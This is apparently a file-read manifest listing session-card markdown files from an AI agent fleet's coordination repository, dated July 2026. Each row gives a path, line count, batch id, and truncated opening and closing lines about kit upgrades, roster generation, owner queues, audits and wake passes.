+READ	.sessions/2026-07-09-succession-package.md	70	full	b03	# 2026-07-09 — succession package (manager chat archiving)	session card — friction → rule, same day it was re-learned.
+READ	.sessions/2026-07-10-archive-prep.md	92	full	b03	# 2026-07-10 — Archive prep: manager-chat succession package	check-time instead of asserted states.
+READ	.sessions/2026-07-10-chain-order-009-010.md	95	full	b03	# 2026-07-10 — continuation-chain slice #2 (ORDER 009 genera	ure-lab starvation folded into the existing boot-click ask).
+READ	.sessions/2026-07-10-chain-slice-4.md	100	full	b03	# 2026-07-10 — chain slice #4: codex-thread verdict + review	Model: Claude (Fable family) — family-level only per Q-0262.
+READ	.sessions/2026-07-10-chain-slice-5-sbgames16-verify.md	79	full	b03	# 2026-07-10 — chain slice #5: MANAGER-VERIFY superbot-games	Model: Claude (Fable family) — family-level only per Q-0262.
+READ	.sessions/2026-07-10-chain-slice-6-sbgames5-verify.md	61	full	b03	# 2026-07-10 — chain slice #6 (~23:36Z fire): superbot-games	📊 Model: fable-5 family (per Q-0262; family-level only).
+READ	.sessions/2026-07-10-coordinator-boot.md	71	full	b03	# 2026-07-10 — Coordinator boot: ORDER 007 (@codex relay rul	session idea.
+READ	.sessions/2026-07-10-custom-instructions-full-paste.md	54	full	b03	# 2026-07-10 — owner ruling: Custom Instructions = FULL per-	eld = full text; ephemeral wake = pointer) before the build.
+READ	.sessions/2026-07-10-fable5-review-landing.md	81	full	b03	# 2026-07-10 — Fable-5 fleet review: synthesis landing (find	reads, not just where the session writes.
+READ	.sessions/2026-07-10-kit-upgrade-v1.7.1.md	109	full	b03	# 2026-07-10 — substrate-kit upgrade v1.7.0 → v1.7.1	the GitHub MCP app credential.
+READ	.sessions/2026-07-10-kit-upgrade-v170.md	69	full	b03	# 2026-07-10 — kit upgrade v1.4.0 → v1.7.0 (distribution wav	oordinator-dispatched) · start 2026-07-10T19:57Z (`date -u`)
+READ	.sessions/2026-07-10-launch-readiness-heartbeat.md	77	full	b03	# 2026-07-10 — launch-readiness heartbeat (owner-dispatch pa	stale within a single wake interval.
+READ	.sessions/2026-07-10-launch-readiness.md	89	full	b03	# 2026-07-10 — Launch-readiness compiler (Q-0261 finalize-fi	research found every real boot risk.
+READ	.sessions/2026-07-10-model-attribution-finding.md	66	full	b03	# 2026-07-10 — Critical finding: model attribution inconsist	rule.
+READ	.sessions/2026-07-10-morning-consolidation.md	91	full	b03	# 2026-07-10 — Morning consolidation after the gen-2 overnig	capabilities recipe this session).
+READ	.sessions/2026-07-10-night-review-landing.md	81	full	b04	# 2026-07-10 — Night-review audit landing (26 Q&A, first ful	two-writer hour on this repo.
+READ	.sessions/2026-07-10-night-review-remediation.md	98	full	b04	# 2026-07-10 — Night-review remediation (freeze ⚑B/⚑D, URGEN	not in a separately-commissioned follow-up.
+READ	.sessions/2026-07-10-order-003-007-review-queue.md	66	full	b04	# 2026-07-10 — ORDER 003 (review-queue enforcement) + ORDER 	er done-when hand-off, not an accident of a missing pointer.
+READ	.sessions/2026-07-10-order-004-economics-ledger.md	73	full	b04	# 2026-07-10 — ORDER 004: fleet economics ledger (P0, deadli	inbox headers instead of restating them.
+READ	.sessions/2026-07-10-order-012-games-mapping.md	72	full	b04	# 2026-07-10 — ORDER 012: games-program mapping proposal (Q-	📊 Model: fable family (family-level per Q-0262.4).
+READ	.sessions/2026-07-10-order-013-games-conformed.md	78	full	b04	# 2026-07-10 — ORDER 013: conformed games mapping (Q-0267 ow	· end 2026-07-10T22:55Z
+READ	.sessions/2026-07-10-package-registry.md	97	full	b04	# 2026-07-10 — package-centralization assembly (projects/ re	real drift seed.
+READ	.sessions/2026-07-10-permissions-doctrine.md	92	full	b04	# 2026-07-10 — Permissions & authority doctrine fold (owner 	explicitly and were re-measured post-edit.
+READ	.sessions/2026-07-10-q0265-doctrine-fold.md	54	full	b04	# 2026-07-10 — Q-0265 continuous-mode doctrine fold (manager	since "the next sweep" is no longer a unique 2-hourly event.
+READ	.sessions/2026-07-10-registry-gap-closure.md	74	full	b04	# 2026-07-10 — prompt-registry gap closure (v-stamps · one-w	m — an honesty note should be the fallback, not the default.
+READ	.sessions/2026-07-10-round3-standing-debts.md	113	full	b04	# 2026-07-10 — Round-3 brief §1 task 1: routines correction 	flag into a probe.
+READ	.sessions/2026-07-10-routine-wall-correction.md	86	full	b04	# 2026-07-10 — Routine-wall correction + wake-arm rollout re	pt it once" per surface before the wall claims the platform.
+READ	.sessions/2026-07-10-ultracode-verification.md	81	full	b04	# 2026-07-10 — ultracode verification: verdict record + env 	both of tonight's "new files only" misstatements impossible.
+READ	.sessions/2026-07-10-universal-permissions-block.md	22	full	b04	# 2026-07-10 — owner directive: canonical PERMISSIONS & AUTH	rd merged stuck at in-progress via #47 and is grandfathered.
+READ	.sessions/2026-07-10-universal-pointer-prompts.md	48	full	b04	# 2026-07-10 — universal pointer prompts (projects/UNIVERSAL	rs find their entry) in the same pass, not just the content.
+READ	.sessions/2026-07-10-wake-1631-order-002.md	79	full	b04	# 2026-07-10 — 16:31Z standing-wake pass (ORDER 002: manifes	ue line added (ORDER 009 is agent-doable — decide-and-flag).
+READ	.sessions/2026-07-10-wake-1831-doctrine.md	107	full	b04	# 2026-07-10 — 18:31Z standing-wake pass (ORDER 001 + 008: d	net-shrank by five resolved decisions).
+READ	.sessions/2026-07-10-wake-drain-roster.md	98	full	b04	# 2026-07-10 — chain slice #3: review-queue drain pass + ros	Model: Claude (Fable family) — family-level only per Q-0262.
+READ	.sessions/2026-07-10-wake-heartbeat.md	72	full	b04	# 2026-07-10 — 14:36Z standing-wake heartbeat (first recurri	generated, not composed, same direction as ORDER 002.
+READ	.sessions/2026-07-11-archive-prep-closeout.md	110	full	b04	# 2026-07-11 — ARCHIVE-PREP CLOSEOUT (coordinator seat wrap-	ns API on `roster-regen.yml` (3 runs, event types verified).
+READ	.sessions/2026-07-11-chain-slice-7-roster3-trading21.md	81	full	b04	# 2026-07-11 — chain slice #7: roster generation #3 + tradin	able family) — harness self-report, family-level per Q-0262.
+READ	.sessions/2026-07-11-coordinator-archive-closeout.md	87	full	b04	# 2026-07-11 — coordinator archive close-out (chat archive p	 commit) and the pre-existing advisory owner-action warning.
+READ	.sessions/2026-07-11-f1-cutover-record.md	69	full	b04	# 2026-07-11 — F-1 cutover record (successor failsafe live, 	ecord, verbatim). Nothing from this slice remains chat-only.
+READ	.sessions/2026-07-11-file-017-018-catchup.md	65	full	b04	# 2026-07-11 — File ORDERs 017/018 + status heartbeat catch-	chat-only.
+READ	.sessions/2026-07-11-forge-relay-chain-idle.md	84	full	b04	# 2026-07-11 — Forge heartbeat-fix relay (ORDER 003) + chain	that mechanically.
+READ	.sessions/2026-07-11-gen-roster-mechanization.md	79	full	b04	# 2026-07-11 — gen_roster.py mechanization (work-ladder item	which is the whole point of the mechanization ladder item.
+READ	.sessions/2026-07-11-heartbeat-2350.md	32	full	b05	# 2026-07-11 — Coordinator heartbeat 23:50Z (control/status.	rediscover it via a denial.
+READ	.sessions/2026-07-11-instruction-env-audit.md	69	full	b05	# 2026-07-11 — fleet instruction + environment audit (owner-	every downstream seat.
+READ	.sessions/2026-07-11-kit-upgrade-v1.10.0.md	68	full	b05	# 2026-07-11 — kit: upgrade v1.9.0 → v1.10.0	open.
+READ	.sessions/2026-07-11-kit-upgrade-v1.10.1.md	67	full	b05	# 2026-07-11 — kit: upgrade v1.10.0 → v1.10.1	remains open.
+READ	.sessions/2026-07-11-kit-upgrade-v1.11.0.md	80	full	b05	# 2026-07-11 — kit: upgrade v1.10.1 → v1.11.0	action-fields` advisory on `control/status.md` remains open.
+READ	.sessions/2026-07-11-kit-upgrade-v1.8.0.md	120	full	b05	# 2026-07-11 — substrate-kit upgrade v1.7.1 → v1.8.0	rule, so distribution workers stop re-deriving it each wave.
+READ	.sessions/2026-07-11-kit-upgrade-v1.9.0.md	79	full	b05	# 2026-07-11 — kit upgrade v1.8.0 → v1.9.0	unread.
+READ	.sessions/2026-07-11-kit-v1-12-0-upgrade.md	103	full	b05	# 2026-07-11 — kit: upgrade v1.11.0 → v1.12.0	on holds the exact AGENT_ORIENTATION patch to merge by hand.
+READ	.sessions/2026-07-11-kit-v1121-upgrade.md	86	full	b05	# 2026-07-11 — kit: upgrade v1.12.0 → v1.12.1	this session's.
+READ	.sessions/2026-07-11-mineverse-retro-registry.md	84	full	b05	# 2026-07-11 — Registry-truth: superbot-mineverse + superbot	  one-shots in the 549-record sweep.
+READ	.sessions/2026-07-11-order-010-relay-owner-queue.md	68	full	b05	# 2026-07-11 — ORDER 010 per-lane relay + owner-queue hygien	plete as the final commit; REST squash-merge on green (R21).
+READ	.sessions/2026-07-11-order-015-registry-centralization.md	71	full	b05	# 2026-07-11 — ORDER 015: registry centralization (Seat A + 	📊 Model: fable-5 · end 2026-07-11T01:4xZ
+READ	.sessions/2026-07-11-order-016-audit-actions.md	86	full	b05	# 2026-07-11 — ORDER 016: audit actions (§2.4 owner-queue it	ld value explicitly (now done for the three codetool metas).
+READ	.sessions/2026-07-11-order-017-instruction-reissue.md	69	full	b05	# 2026-07-11 — ORDER 017: re-issue lane instructions from co	hand-iterating `wc -c`.
+READ	.sessions/2026-07-11-order-018-env-consolidation.md	102	full	b05	# 2026-07-11 — ORDER 018: environment/setup-script consolida	for retirement/deprecation ORDERs.
+READ	.sessions/2026-07-11-owner-codex-fleetwide.md	92	full	b05	# 2026-07-11 — owner update: Codex fleet-wide enablement + s	probe step, not rely on comment threads.
+READ	.sessions/2026-07-11-owner-queue-verified-refresh.md	66	full	b05	# 2026-07-11 — Verified fleet-wide owner-queue refresh	📊 Model: fable-5
+READ	.sessions/2026-07-11-p1-freshness-custodian.md	145	full	b05	# 2026-07-11 — P1 FRESHNESS: triggers snapshot + automated r	  the flip push).
+READ	.sessions/2026-07-11-p2-queue-generation.md	158	full	b05	# 2026-07-11 — P2 QUEUE GENERATION: owner-queue candidate fe	deleted at close per `control/claims/README.md`.
+READ	.sessions/2026-07-11-p3-coverage-index.md	103	full	b05	# 2026-07-11 — P3 COVERAGE + INDEX (fleet centralization pla	card (flips with this commit); stamp finding fixed in-slice.
+READ	.sessions/2026-07-11-permission-rules-port.md	68	full	b05	# 2026-07-11 — Port superbot agent-permission rules (.claude	stale-green.
+READ	.sessions/2026-07-11-relay-completion.md	24	full	b05	# 2026-07-11 — ORDER 010 relay completion (superbot-idle + s	📊 Model: fable-5
+READ	.sessions/2026-07-11-restructure-prompts-slice2.md	114	full	b05	# 2026-07-11 — fleet restructure slice 2: prompt re-sync (co	wrong landing path on its first PR.
+READ	.sessions/2026-07-11-restructure-roster-slice3.md	100	full	b05	# 2026-07-11 — fleet restructure slice 3: owner queue + rost	registry it points at.
+READ	.sessions/2026-07-11-restructure-seats.md	115	full	b05	# 2026-07-11 — Fleet restructure slice 1: the 8 standing sea	  manager's call (restructure directive).
+READ	.sessions/2026-07-11-review-queue-verify-8-12.md	51	full	b05	# 2026-07-11 — Review-queue manager-verify: pokemon-mod-lab#	and checkable; nothing else to fault.
+READ	.sessions/2026-07-11-roster-gen-4.md	73	full	b06	# 2026-07-11 — Roster generation #4 + parallel-run vs superb	this.
+READ	.sessions/2026-07-11-roster-gen-5-sweep.md	93	full	b06	# 2026-07-11 — Roster generation #5 + first ground-truth ver	drift.
+READ	.sessions/2026-07-11-roster-gen-6.md	91	full	b06	# 2026-07-11 — Roster generation #6 + gen_roster.py verifica	  Model / idea / review markers.
+READ	.sessions/2026-07-11-universal-v4-merge-clause.md	60	full	b06	# 2026-07-11 — UNIVERSAL v4: corrected §2.4 merge clause (re	R 003); stamps should come from `date -u`, never rounded up.
+READ	.sessions/2026-07-12-consolidation-plan-v34.md	69	full	b06	# 2026-07-12 — consolidation plan + prompt v3.4 restamp (pha	post-hoc reconciliation.
+READ	.sessions/2026-07-12-consolidation-reset-plan.md	60	full	b06	# 2026-07-12 — Fleet consolidation + seat reset plan (game-l	atus.md quotes, for anything feeding a disposition decision.
+READ	.sessions/2026-07-12-coordinator-closeout.md	40	full	b06	# 2026-07-12 — coordinator close-out	requirement from a failed gate run.
+READ	.sessions/2026-07-12-external-research-prompt.md	22	full	b06	# 2026-07-12 — external GPT deep-research prompt	 PR bodies, so the dictionary rule has one surface to check.
+READ	.sessions/2026-07-12-heartbeat-v33.md	31	full	b06	# 2026-07-12 — heartbeat: control/status.md v3.3 landing	it caught drift twice today.
+READ	.sessions/2026-07-12-kit-upgrade-v1.15.0.md	28	full	b06	# 2026-07-12 — kit upgrade v1.14.0 → v1.15.0	 until then the preflight re-check stays mandatory doctrine.
+READ	.sessions/2026-07-12-kit-upgrade-v1130.md	24	full	b06	# 2026-07-12 — kit upgrade v1.12.1 → v1.13.0 (distribution w	 would close the loop rather than re-flagging a fourth time.
+READ	.sessions/2026-07-12-kit-upgrade-v1140.md	61	full	b06	# 2026-07-12 — kit upgrade v1.13.0 → v1.14.0	st so the next distribution wave can diff them mechanically.
+READ	.sessions/2026-07-12-merge-on-green.md	67	full	b06	# 2026-07-12 — merge-on-green: permanent landing path for RE	ting path@SHA before writing a line is the cheap prevention.
+READ	.sessions/2026-07-12-oq-restamp-v31.md	57	full	b06	# 2026-07-12 — owner-queue re-stamp: C#34–C#36 onto prompts 	is a cheap grep against the queue's backtick paths.
+READ	.sessions/2026-07-12-order-014-v31-crosscheck.md	58	full	b06	# 2026-07-12 — ORDER 014 cross-check: kit hardening input vs	nclude "one instance of each trigger-binding kind" replay.
+READ	.sessions/2026-07-12-order-020-trigger-health.md	82	full	b06	# 2026-07-12 — ORDER 020: per-wake trigger-health check	the export.
+READ	.sessions/2026-07-12-order020-tick-pileup.md	75	full	b06	# 2026-07-12 — ORDER 020 amendment: TICK PILE-UP signature +	the successor knows the line is a snapshot, not a fact.
+READ	.sessions/2026-07-12-prompts-v3-1-qa-fixes.md	77	full	b06	# 2026-07-12 — Prompts v3.1: apply QA fixes (boot-sim, incid	explicit.
+READ	.sessions/2026-07-12-prompts-v3-2-stateless.md	81	full	b06	# 2026-07-12 — prompts v3.2: strip volatile state from start	verdict.
+READ	.sessions/2026-07-12-prompts-v3-draft.md	64	full	b06	# 2026-07-12 — Prompts v3 draft: universal startup + ender +	rtifact-A time would have been 8× cheaper than at seat time.
+READ	.sessions/2026-07-12-prompts-v33.md	67	full	b06	# 2026-07-12 — prompts v3.3: seat-first keyword-dictionary C	flip (ender step 2).
+READ	.sessions/2026-07-12-qa-boot-sim.md	54	full	b06	# 2026-07-12 — QA boot simulation of the v3 startup prompt s	landing path) — regen-at-send, not copy-at-draft.
+READ	.sessions/2026-07-12-qa-incident-replay.md	23	full	b06	# 2026-07-12 — QA incident replay vs prompts v3 (Wave 3)	opies), so "derived file lags its template" can never merge.
+READ	.sessions/2026-07-12-qa-question-rounds.md	43	full	b06	# 2026-07-12 — QA question rounds against the v3 prompt set	registry but live in the pastes is still a live defect.
+READ	.sessions/2026-07-12-registry-sync-v32.md	80	full	b06	# 2026-07-12 — registry sync: projects/ seat files to prompt	check-registry` guard makes that drift visible mechanically.
+READ	.sessions/2026-07-12-repo-consolidation-census.md	22	full	b06	# 2026-07-12 — repo consolidation census (phase A)	itly in its own Status banner and Negative-findings section.
+READ	.sessions/2026-07-12-research-census-core.md	45	full	b07	# 2026-07-12 — Problem census: core repos (research)	takeover session can locate them without the dispatcher.
+READ	.sessions/2026-07-12-research-census-sat.md	56	full	b07	# 2026-07-12 — Research: problem census — satellite repos	the doc.
+READ	.sessions/2026-07-12-research-platform.md	40	full	b07	# 2026-07-12 — research: platform capability/limitation ledg	one-token edit.
+READ	.sessions/2026-07-12-research-prompt-arch.md	41	full	b07	# 2026-07-12 · research-prompt-arch	the flip-complete push, not only after CI reds.
+READ	.sessions/2026-07-12-research-prompt-currency.md	47	full	b07	# 2026-07-12 — research: prompt-currency audit (v3.3 vs kit 	v3.3 dictionary failed to prevent (now delta 1/P0).
+READ	.sessions/2026-07-12-roster-pokemon-transport.md	88	full	b07	# 2026-07-12 — roster: honest UNREADABLE verdict + authentic	throws it away.
+READ	.sessions/2026-07-12-seat-digest-regen-wiring.md	128	full	b07	# 2026-07-12 — seat-digest regen wiring (grounded-skills sli	­as index exists to update in fm; claim deleted this commit.
+READ	.sessions/2026-07-12-staleness-sweep-8seat.md	56	full	b07	# 2026-07-12 — staleness sweep: first 8-seat registry sweep	in the heartbeat would make the omission impossible.
+READ	.sessions/2026-07-12-sweep-midday.md	23	full	b07	# 2026-07-12 — midday staleness sweep (8 seats)	ual fix here (line updated to #113 with #112 marked merged).
+READ	.sessions/2026-07-12-trigger-health-remediation.md	78	full	b07	# 2026-07-12 — trigger-health remediation	the load.
+READ	.sessions/2026-07-13-central-docs-review.md	45	full	b07	# Session — 2026-07-13 — central-docs-review	- 📊 Model: fable-family · high · docs-landing
+READ	.sessions/2026-07-13-consolidation-batch.md	102	full	b07	# 2026-07-13 — consolidation batch (inbox flips + R24 gate +	PR class so the omission is doctrine instead of drift.
+READ	.sessions/2026-07-13-coordinator-close.md	151	full	b07	# 2026-07-13 — Coordinator session close-out: retro + final 	ssons baked). Merge-on-green sweep lands it — no self-merge.
+READ	.sessions/2026-07-13-eap-final-worklists.md	35	full	b07	# Session 2026-07-13 · EAP-final-worklists	is a turn-key run instead of a bespoke build.
+READ	.sessions/2026-07-13-fleet-rollup.md	65	full	b07	# 2026-07-13 — fleet night-report roll-up (owner ask ~09:00Z	lines should do the same (slug first, number in parens).
+READ	.sessions/2026-07-13-morning-tally.md	83	full	b07	# 2026-07-13 — Morning tally (ORDER 039/040 morning delivera	rs idle's outbox requests; verify 042/043 pickups next wake.
+READ	.sessions/2026-07-13-night-final-order.md	67	full	b07	# 2026-07-13 — Land the owner's FINAL night order (ORDER 040	inator instruction; the merge-on-green sweep lands PR #152.)
+READ	.sessions/2026-07-13-night-watchdog-1.md	127	full	b07	# 2026-07-13 — night watchdog 1 (R26 registry export + trigg	from "PASS on fresh basis".
+READ	.sessions/2026-07-13-night-watchdog-2.md	163	full	b07	# 2026-07-13 — night watchdog 2 (R26 registry export + trigg	ambiguous verdicts always name their own resolution test.
+READ	.sessions/2026-07-13-night-watchdog-3.md	112	full	b07	# 2026-07-13 — Night watchdog 3 (R26)	workflows). ≤2 CI polls then report.
+READ	.sessions/2026-07-13-r27-detection-amendment.md	54	full	b07	# 2026-07-13 — R27 detection amendment (first-execution less	main-only shadow again.
+READ	.sessions/2026-07-13-route-batch2.md	89	full	b07	# 2026-07-13 — Route batch-2 SIM-REQUESTs + venture sandbox 	lands via their enabler. ≤2 CI polls each, then report.
+READ	.sessions/2026-07-13-route-idle-questions.md	93	full	b07	# 2026-07-13 — Route idle owner questions (Q-0264 fan-in)	session card, no workflows). ≤2 CI polls then report.
+READ	.sessions/2026-07-13-trigger-health-i1.md	59	full	b07	# 2026-07-13 — Trigger-health I1 absent-enabled fix (coordin	PR is already terminal.
+READ	.sessions/2026-07-13-v3-rider-fold.md	70	full	b07	# 2026-07-13 — v3 registry: fold the autonomy rider + superb	park green / merge-on-green sweep, ORDER 039 rule 2.)
+READ	.sessions/2026-07-13-v35-stage2.md	65	full	b07	# 2026-07-13 — v3.5 stage-2: prompt-generation completion (v	correction.
+READ	.sessions/2026-07-13-wake-1434z.md	16	full	b08	# Session — 2026-07-13 failsafe wake 14:34Z	so the flip and the claim removal can never land separately.
+READ	.sessions/2026-07-13-wake-1633z.md	18	full	b08	# Session — 2026-07-13 failsafe wake 16:33Z	he failsafe wake prompt's R26 line at the next v3.x restamp.
+READ	.sessions/2026-07-13-wake-1834z.md	23	full	b08	# Session — 2026-07-13 failsafe wake 18:34Z	r scripted, per the 💡 above) instead of re-derived per wake.
+READ	.sessions/2026-07-13-wake-2033z.md	53	full	b08	# Session · 2026-07-13 · failsafe wake 20:33Z	have saved both wakes the repeated I1b re-derivation.
+READ	.sessions/2026-07-13-wake.md	70	full	b08	# 2026-07-13 — FM wake work loop (coordinator-seat wake, rep	 flagged pile-up will likely have self-resolved by its boot.
+READ	.sessions/2026-07-14-branch-recreation-followup.md	15	full	b08	# 2026-07-14 — Branch-recreation census follow-up (findings 	indings ledger before recording it as the verification path.
+READ	.sessions/2026-07-14-branch-sweep-addendum.md	16	full	b08	# 2026-07-14 — branch-sweep addendum (dispatched executor)	 column, not just the note, when evidence undercuts the rec.
+READ	.sessions/2026-07-14-checklist-refresh-2.md	11	full	b08	# Session — 2026-07-14 — EAP owner-checklist refresh #2	eep greps open PRs by ORDER instead of re-probing raw paths.
+READ	.sessions/2026-07-14-eap-final-closeout.md	72	full	b08	# 2026-07-14 — EAP final-day closeout: lane recon, final ORD	thirteen.
+READ	.sessions/2026-07-14-eap-final-ender.md	57	full	b08	# 2026-07-14 — EAP final ender (email addendum + RESUME.md +	ated: none — executed the dispatched final-ender scope only.
+READ	.sessions/2026-07-14-eap-project-audit.md	53	full	b08	# 2026-07-14 — EAP close-out project audit	⚑ Self-initiated: none (owner-directed)
+READ	.sessions/2026-07-14-eap-synthesis.md	18	full	b08	# 2026-07-14 — EAP final synthesis (owner email draft + cons	ve append. Improvement: the pre-filed ORDER-stub rule above.
+READ	.sessions/2026-07-14-email-rebalance.md	16	full	b08	# 2026-07-14 — EAP final email draft rebalance (owner-direct	conventions so the next external doc is born self-contained.
+READ	.sessions/2026-07-14-fm-dispatch-0530z-close.md	87	full	b08	# 2026-07-14 — fm dispatch 0530Z close (coordinator fan-out 	he deferral — one grep then saves a scout premise-check now.
+READ	.sessions/2026-07-14-fm-dispatch-0740z.md	71	full	b08	# 2026-07-14 — fm dispatch 0740z close (coordinator fan-out 	other writers and must still be re-checked at write time.
+READ	.sessions/2026-07-14-fm-dispatch-ledger.md	67	full	b08	# 2026-07-14 — fm dispatch ledger (coordinator fan-out close	check per row.
+READ	.sessions/2026-07-14-kit-upgrade-v1.16.0.md	22	full	b08	# 2026-07-14 — kit upgrade v1.15.0 → v1.16.0	d make the fm telemetry lane harvestable back to 2026-07-14.
+READ	.sessions/2026-07-14-ledger-trueup-13.md	33	full	b08	# 2026-07-14 — EAP ledger true-up to 13/13 after superbot #2	intended scope, not prohibitions.
+READ	.sessions/2026-07-14-post-sweep-reconcile.md	13	full	b08	# 2026-07-14 — Post-sweep reconciliation (EAP final state)	s records mechanically instead of re-measuring from scratch.
+READ	.sessions/2026-07-14-wake-0235z.md	131	full	b08	# Session · 2026-07-14 · overnight wake 02:35Z	honest handoff in the PR body.
+READ	.sessions/2026-07-14-wake-0434z.md	107	full	b08	# Session · 2026-07-14 · failsafe wake 04:34Z	rather than exhorted.
+READ	.sessions/2026-07-14-wake-0633z.md	71	full	b08	# 2026-07-14 — Failsafe wake 0633Z	rule into the dispatch-log header/conventions.
+READ	.sessions/2026-07-14-wake-0845z.md	114	full	b08	# 2026-07-14 — Failsafe wake 0845Z	to move it.
+READ	.sessions/2026-07-14-wake-2034z.md	63	full	b08	# 2026-07-14 — Failsafe wake 2034Z	efresh as a standing wake step, which this session executed.
+READ	.sessions/2026-07-14-walkthrough-sweep.md	22	full	b08	# 2026-07-14 — EAP walkthrough straggler sweep	straggler sweep edits one row instead of three prose blocks.
+READ	.sessions/2026-07-15-card-modelline-groom.md	40	full	b08	# 2026-07-15 — Overnight re-sweep + model-line card grooming	- 📊 Model: Claude Fable (Claude 5 family) · high · docs-only
+READ	.sessions/2026-07-15-cr-disposition-sweep.md	56	full	b09	# Session — 2026-07-15 — curious-research disposition + rebo	📊 Model:** Claude Fable (Claude 5 family) · high · docs-only
+READ	.sessions/2026-07-15-fleet-oversight-evening.md	79	full	b09	# 2026-07-15 — fleet-oversight-evening (fm wake: staleness s	  both misses.
+READ	.sessions/2026-07-15-lanes-regen-fix.md	68	full	b09	# 2026-07-15 — lanes-regen-fix (fm slice: lanes.json generat	  apply on every friction.
+READ	.sessions/2026-07-15-merge-on-green-verify-0715.md	107	full	b09	# 2026-07-15 — merge-on-green-verify-0715 (rollout verificat	  `mergeable_state` probe.
+READ	.sessions/2026-07-15-oversight-wake-0715.md	76	full	b09	# 2026-07-15 · oversight wake (14:58Z)	> owner — this session never merges, per dispatch.
+READ	.sessions/2026-07-15-oversight-wake-0715b.md	101	full	b09	# 2026-07-15 — oversight-wake-0715b (routine seat wake: rost	  standing queue home C#36.
+READ	.sessions/2026-07-15-oversight-wake-1659.md	84	full	b09	# Session — 2026-07-15 oversight wake (16:59Z)	 the dispatch ladder consumed the session; no forced filler.
+READ	.sessions/2026-07-15-owner-no-review-order.md	60	full	b09	# 2026-07-15 — owner no-PR-review directive → fleet ORDER + 	📊 Model: Fable
+READ	.sessions/2026-07-15-owner-queue-kit-go.md	46	full	b09	# Session — 2026-07-15 — owner-queue asks (kit-go + fable5 #	📊 Model:** Claude Fable (Claude 5 family) · high · docs-only
+READ	.sessions/2026-07-15-pre-reboot-review.md	25	full	b09	# 2026-07-15 — Pre-reboot fleet review landing	de Fable (Claude 5 family) · high · docs-only (coordination)
+READ	.sessions/2026-07-15-prompts-v37-duty-form.md	83	full	b09	# 2026-07-15 — v3.7 duty-form prompt registry + owner execut	laude 5 family) · high · docs-only (prompt-registry rewrite)
+READ	.sessions/2026-07-15-queue-a63-next-triage.md	65	full	b09	# 2026-07-15 — queue-a63-next-triage (fm slice: A#63 + super	ackfill from transcripts vs annotate unknowable), unchanged.
+READ	.sessions/2026-07-15-registry-v3-5-synthesis.md	87	full	b09	# 2026-07-15 — registry v3.5 synthesis verification + paste-	ick lands #227, verify the merge and sweep A#63 to Resolved.
+READ	.sessions/2026-07-15-retire-c61.md	18	full	b09	# 2026-07-15 — Retire owner-queue C#61 (kit resumed lane-sid	- 📊 Model: Claude Fable (Claude 5 family) · high · docs-only
+READ	.sessions/2026-07-15-roster-regen-0810.md	60	full	b09	# 2026-07-15 — roster-regen-0810 (fm slice: freshness + seat	ther to backfill from transcripts or annotate as unknowable.
+READ	.sessions/2026-07-15-session-ender-handoff.md	71	full	b09	# 2026-07-15 — session-ender-handoff (fm slice: RESUME.md ha	  verdict in docs/fleet-triage.md stands.
+READ	.sessions/2026-07-15-triggers-snapshot-refresh-2.md	48	full	b09	# Session — 2026-07-15 — triggers snapshot refresh (17:21Z e	h earlier than the dispatched refresh that produced this PR.
+READ	.sessions/2026-07-15-wake-1126z-queue-sweep.md	87	full	b09	# 2026-07-15 — wake-1126z-queue-sweep (fm wake: queue A#62 s	  for coordinator disposition.
+READ	.sessions/2026-07-16-fm-wake-jul16.md	78	full	b09	# 2026-07-16 — fm-wake-jul16 (routine maintenance wake)	hen, so the gap is a missed assignment, not an ambient hope.
+READ	.sessions/2026-07-16-morning-wake-triage.md	74	full	b09	# Session — 2026-07-16 · morning wake triage	**Denials:** none — no tool denial encountered this session.
+READ	.sessions/2026-07-16-night-audit-records.md	23	full	b09	# 2026-07-16 — night audit records (wake session)	fix remains the E#66 doctrine ruling, already queued.
+READ	.sessions/2026-07-16-overnight-plan-menu-0716.md	15	full	b09	# Session — overnight-plan-menu-0716	 manual recon to rediscover — exactly what happened tonight.
+READ	.sessions/2026-07-16-pr-audit-0716.md	54	full	b09	# 2026-07-16 — pr-audit-0716 (fleet-wide PR-landing audit)	  assemble-snapshot idea.
+READ	.sessions/2026-07-16-queue-audit-items-0716.md	27	full	b09	# 2026-07-16 — queue-audit records (wake session)	of another backlog entry that waits for its own future wake.
+READ	.sessions/2026-07-16-r26-trigger-tooling.md	71	full	b09	# 2026-07-16 — r26-trigger-tooling (routine R26 wake)	  one wake.
+READ	.sessions/2026-07-16-recreation-runbook-0716.md	11	full	b09	# 2026-07-16 — recreation-runbook-0716 (EAP project-recreati	n orphan sweep no longer depends on re-parsing a 2.7MB JSON.
+READ	.sessions/2026-07-16-sweep-stale-claim.md	18	full	b10	# 2026-07-16 — sweep-stale-claim (terminal-lane stale-claim 	dea above) beat scheduling a human/agent wake to eyeball it.
+READ	.sessions/2026-07-16-trigger-snapshot-pm.md	66	full	b10	# 2026-07-16 — trigger-snapshot-pm (R26 snapshot refresh wak	  theme.
+READ	.sessions/2026-07-16-wake-0716-pm-fix227prov.md	22	full	b10	# Session — 2026-07-16 wake-0716-pm #227-provenance correcti	able-family · high effort · fleet-oversight wake (follow-up)
+READ	.sessions/2026-07-16-wake-0716-pm-sweep.md	31	full	b10	# Session — 2026-07-16 wake-0716-pm oversight sweep	ew names still stands as a genuine friction→guard candidate.
+READ	.sessions/2026-07-17-coordinator-ender.md	23	full	b10	# Session — coordinator ender (close-out heartbeat) · 2026-0	p enforcing rather than exhortative (Q-0194 friction→guard).
+READ	.sessions/2026-07-17-fm-anthropic-email-pack.md	21	full	b10	# Session — fm-anthropic-email-pack	rce that rather than leave it to the next session to notice.
+READ	.sessions/2026-07-17-fm-recreation-ruling.md	22	full	b10	# Session — fm-recreation-ruling	rt instinct applied to deferred work, not just current work.
+READ	.sessions/2026-07-17-fm-s5-docs-link-drift.md	24	full	b10	# Session — fm-s5-docs-link-drift	op the same way `docs/ideas/README.md` routes product ideas.
+READ	.sessions/2026-07-17-fm-s9-capabilities-wall-age.md	24	full	b10	# Session — fm-s9-capabilities-wall-age	ot as current. That makes the outbound artifact self-dating.
+READ	.sessions/2026-07-17-fm-wake-chain-record-fix.md	21	full	b10	# Session — fm-wake-chain-record-fix	k rather than an exhortation (enforce-don't-exhort, Q-0132).
+READ	.sessions/2026-07-17-fm-winddown-housekeeping.md	23	full	b10	# Session — fm-winddown-housekeeping	ract selftest in the 💡 above is the enforcing form of this).
+READ	.sessions/2026-07-17-fresh-start-cleanup.md	67	full	b10	# 2026-07-17 — fresh-start-cleanup (EAP wind-down hub cleanu	a CI signal instead of a thing the next human has to notice.
+READ	.sessions/2026-07-17-midday-snapshot-0717.md	37	full	b10	# Session — midday-snapshot-0717	ore the next occurrence instead of living as a backlog idea.
